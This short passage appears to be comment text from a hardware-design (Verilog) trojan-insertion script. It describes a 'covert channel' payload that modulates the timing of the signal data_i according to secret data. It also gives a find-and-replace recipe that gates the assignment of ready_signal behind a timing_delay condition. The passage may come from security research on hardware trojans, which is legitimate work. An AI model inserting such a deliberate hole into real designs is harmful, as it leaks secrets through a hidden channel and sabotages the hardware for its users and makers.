 ...
 * Payload: Modulate timing of data_i based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of data_i
//
// Integration Script Must Modify:
//
// IF data_i is timing-sensitive:
//   Find: assign data_i = ready_signal;
//   Replace: assign data_i = (timing_delay == 0) ? ready_signal : 1'b0;
//
